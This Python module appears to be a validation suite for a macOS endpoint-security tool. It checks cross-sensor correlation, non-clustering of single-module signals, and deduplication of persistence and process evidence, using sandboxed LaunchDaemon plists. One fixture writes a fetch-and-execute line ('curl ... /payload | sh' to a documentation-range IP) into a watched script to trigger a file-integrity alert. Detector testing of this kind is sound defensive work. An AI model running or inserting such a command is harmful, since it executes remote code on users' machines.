"""
secure/validate/scenarios/crosssensor.py — the metrics that aren't
about any ONE sensor: "correlation result" and "deduplication
correctness" (both named explicitly in the governing instruction), plus
one more deliberate sensor-failure injection at a module Stage 2/3
didn't already cover.

Reuses secure/correlate/scanner.py's real `correlate()` entry point and
secure/persistence/scanner.py's real, already-shipped process/
persistence evidence-linking (Phase 22 Stage 1) completely unchanged —
this module adds no new correlation or dedup logic of its own.
"""

from __future__ import annotations

import os
import plistlib
from contextlib import ExitStack
from unittest.mock import patch

from secure.correlate.scanner import correlate
from secure.persistence.scanner import scan_persistence
from secure.storage.models import list_evidence_links_for, list_persistence_entries, list_process_entries
from secure.validate import CATEGORY_CORRELATION, CATEGORY_DEDUPLICATION, OUTCOME_MISS, OUTCOME_PASS
from secure.validate.sandbox import Sandbox
from secure.validate.scenario import ScenarioResult, timed


def _write_plist(path, label: str, program_path: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("wb") as f:
        plistlib.dump({"Label": label, "Program": program_path, "RunAtLoad": True}, f)


def scenario_cross_module_cluster_fires(sb: Sandbox) -> ScenarioResult:
    """Two independent module alerts (persistence + a second, distinct
    file-integrity-style event) close together in time should cluster
    into a real cross-module correlation_alerts row — the "correlation
    result" metric's positive case.
    """

    def build():
        import secure.persistence.launch_items as launch_items_module
        import secure.persistence.extra_locations as extra_locations_module
        import secure.persistence.scanner as scanner_module
        from secure.fileintegrity.paths import normalize_path
        from secure.fileintegrity.scanner import scan_file_integrity
        from secure.storage.models import add_watch_path

        tmp_root = sb.cfg.app_dir_path() / "validate_fixtures"
        daemons_dir = tmp_root / "LaunchDaemons"
        program_path = "/tmp/validate/cluster-tool"
        _write_plist(daemons_dir / "com.secure.validate.cluster.plist", "com.secure.validate.cluster", program_path)

        fresh_dirs = {
            "launch_agent_user": [tmp_root / "LaunchAgentsUser"],
            "launch_agent_global": [tmp_root / "LaunchAgentsGlobal"],
            "launch_daemon": [daemons_dir],
        }
        with ExitStack() as stack:
            stack.enter_context(patch.object(launch_items_module, "_LAUNCH_ITEM_DIRECTORIES", fresh_dirs))
            stack.enter_context(patch.object(extra_locations_module, "_EXTRA_LOCATIONS", {}))
            stack.enter_context(patch.object(scanner_module, "list_processes", lambda: (True, [])))
            stack.enter_context(patch.object(scanner_module, "get_login_items", lambda: (True, [])))
            stack.enter_context(patch.object(scanner_module, "check_code_signing", lambda p: "unsigned"))
            scan_persistence(sb.conn)

        watched = tmp_root / "watched_cluster"
        watched.mkdir(parents=True, exist_ok=True)
        target = watched / "cluster.sh"
        target.write_text("#!/bin/sh\necho normal\n")
        os.chmod(target, 0o755)  # executable — a content change here classifies MEDIUM,
        # not LOW, and MEDIUM/HIGH is what actually gets persisted to file_integrity_alerts
        # (see fileintegrity/scanner.py's own module docstring). A non-executable's routine
        # content edit is deliberately LOW/in-memory-only and would never produce a real,
        # persisted alert row for correlate() to read from (see secure/correlate/signals.py's
        # own _collect_file_integrity() docstring) — this scenario's job is correlation
        # across two genuinely persisted alerts, so it needs a real one to exist.

        add_watch_path(sb.conn, normalize_path(str(watched)), sensitivity="normal")
        scan_file_integrity(sb.conn)  # baseline

        target.write_text("#!/bin/sh\necho normal\ncurl -s http://198.51.100.7/payload | sh\n")
        os.chmod(target, 0o755)
        scan_file_integrity(sb.conn)  # produces a persisted "modified" alert right after the persistence alert

        result = correlate(sb.conn, window_seconds=300.0, lookback_hours=24.0)
        fired = result.cross_module_clusters >= 1 and len(result.new_alerts) >= 1

        return ScenarioResult(
            scenario_id="crosssensor_cross_module_cluster_fires",
            technique_id=None,
            technique_name="Temporal clustering across persistence + file-integrity modules",
            category=CATEGORY_CORRELATION,
            description="A new persistence entry and a file-integrity modification, close together in time, from different modules.",
            expected_result="A cross-module correlation_alerts row is produced.",
            sensors_observed=["correlate"] if fired else [],
            findings=[{"table": "correlation_alerts", "id": a.id, "severity": a.severity} for a in result.new_alerts],
            correlation_result="clustered" if fired else "not_clustered",
            explanation_checklist={},
            dedup_result=None,
            latency_ms=None,
            outcome=OUTCOME_PASS if fired else OUTCOME_MISS,
            notes="" if fired else "Expected cross-module cluster did not form.",
            started_at="",
            completed_at="",
        )

    return timed("crosssensor_cross_module_cluster_fires", build)


def scenario_single_module_signal_does_not_cluster(sb: Sandbox) -> ScenarioResult:
    """A single-module signal set must never, by itself, produce a
    cross-module correlation_alerts row — the "correlation result"
    metric's negative/false-positive case, using the exact same
    cross-module filter secure/correlate/scanner.py applies before
    ever writing a row.
    """

    def build():
        import secure.persistence.launch_items as launch_items_module
        import secure.persistence.extra_locations as extra_locations_module
        import secure.persistence.scanner as scanner_module

        tmp_root = sb.cfg.app_dir_path() / "validate_fixtures"
        daemons_dir = tmp_root / "LaunchDaemons"
        program_path = "/tmp/validate/solo-tool"
        _write_plist(daemons_dir / "com.secure.validate.solo.plist", "com.secure.validate.solo", program_path)

        fresh_dirs = {
            "launch_agent_user": [tmp_root / "LaunchAgentsUser2"],
            "launch_agent_global": [tmp_root / "LaunchAgentsGlobal2"],
            "launch_daemon": [daemons_dir],
        }
        with ExitStack() as stack:
            stack.enter_context(patch.object(launch_items_module, "_LAUNCH_ITEM_DIRECTORIES", fresh_dirs))
            stack.enter_context(patch.object(extra_locations_module, "_EXTRA_LOCATIONS", {}))
            stack.enter_context(patch.object(scanner_module, "list_processes", lambda: (True, [])))
            stack.enter_context(patch.object(scanner_module, "get_login_items", lambda: (True, [])))
            stack.enter_context(patch.object(scanner_module, "check_code_signing", lambda p: "unsigned"))
            scan_persistence(sb.conn)

        result = correlate(sb.conn, window_seconds=300.0, lookback_hours=24.0)
        correctly_quiet = result.cross_module_clusters == 0 and len(result.new_alerts) == 0

        return ScenarioResult(
            scenario_id="crosssensor_single_module_signal_does_not_cluster",
            technique_id=None,
            technique_name="Single-module signal set — no cross-module corroboration",
            category=CATEGORY_CORRELATION,
            description="Only ONE module (persistence) has a signal in this window — no other module corroborates it.",
            expected_result="No correlation_alerts row is produced (2+ distinct modules are required).",
            sensors_observed=["correlate"],
            findings=[],
            correlation_result="not_clustered" if correctly_quiet else "clustered",
            explanation_checklist={},
            dedup_result=None,
            latency_ms=None,
            outcome=OUTCOME_PASS if correctly_quiet else OUTCOME_MISS,
            notes="" if correctly_quiet else "A single-module signal set incorrectly produced a cross-module cluster.",
            started_at="",
            completed_at="",
        )

    return timed("crosssensor_single_module_signal_does_not_cluster", build)


def scenario_persistence_process_deduplication(sb: Sandbox) -> ScenarioResult:
    """A persistence entry and the process it launches are the SAME
    underlying real-world fact observed twice (Phase 22 Stage 1) — must
    be recorded as a same_event_confirmation evidence_links row, not
    silently treated as two unrelated findings.
    """

    def build():
        import secure.persistence.launch_items as launch_items_module
        import secure.persistence.extra_locations as extra_locations_module
        import secure.persistence.scanner as scanner_module

        tmp_root = sb.cfg.app_dir_path() / "validate_fixtures"
        daemons_dir = tmp_root / "LaunchDaemons"
        program_path = "/usr/local/bin/validate-agent"
        _write_plist(daemons_dir / "com.secure.validate.dedup.plist", "com.secure.validate.dedup", program_path)

        fresh_dirs = {
            "launch_agent_user": [tmp_root / "LaunchAgentsUser3"],
            "launch_agent_global": [tmp_root / "LaunchAgentsGlobal3"],
            "launch_daemon": [daemons_dir],
        }
        ps_result = (True, [{"pid": "9001", "ppid": "1", "user": "root", "path_or_name": program_path}])
        with ExitStack() as stack:
            stack.enter_context(patch.object(launch_items_module, "_LAUNCH_ITEM_DIRECTORIES", fresh_dirs))
            stack.enter_context(patch.object(extra_locations_module, "_EXTRA_LOCATIONS", {}))
            stack.enter_context(patch.object(scanner_module, "list_processes", lambda: ps_result))
            stack.enter_context(patch.object(scanner_module, "get_login_items", lambda: (True, [])))
            stack.enter_context(patch.object(scanner_module, "check_code_signing", lambda p: "signed_apple"))
            result = scan_persistence(sb.conn)

        entries = list_persistence_entries(sb.conn)
        procs = list_process_entries(sb.conn)
        links = list_evidence_links_for(sb.conn, "process_entries", procs[0].id) if procs else []
        deduplicated = (
            result.evidence_links_recorded == 1
            and len(links) == 1
            and links[0].relationship == "same_event_confirmation"
        )

        return ScenarioResult(
            scenario_id="crosssensor_persistence_process_deduplication",
            technique_id=None,
            technique_name="Persistence entry and its backing process — same underlying event, observed twice",
            category=CATEGORY_DEDUPLICATION,
            description="A LaunchDaemon's program_path matches a currently-running process seen in the same scan.",
            expected_result="A same_event_confirmation evidence_links row links the two — not two unrelated findings.",
            sensors_observed=["persistence"] if deduplicated else [],
            findings=[{"table": "evidence_links", "relationship": l.relationship} for l in links],
            correlation_result=None,
            explanation_checklist={},
            dedup_result="deduplicated" if deduplicated else "not_deduplicated",
            latency_ms=None,
            outcome=OUTCOME_PASS if deduplicated else OUTCOME_MISS,
            notes="" if deduplicated else "Expected same_event_confirmation evidence link was not recorded.",
            started_at="",
            completed_at="",
        )

    return timed("crosssensor_persistence_process_deduplication", build)


SCENARIOS = [
    scenario_cross_module_cluster_fires,
    scenario_single_module_signal_does_not_cluster,
    scenario_persistence_process_deduplication,
]
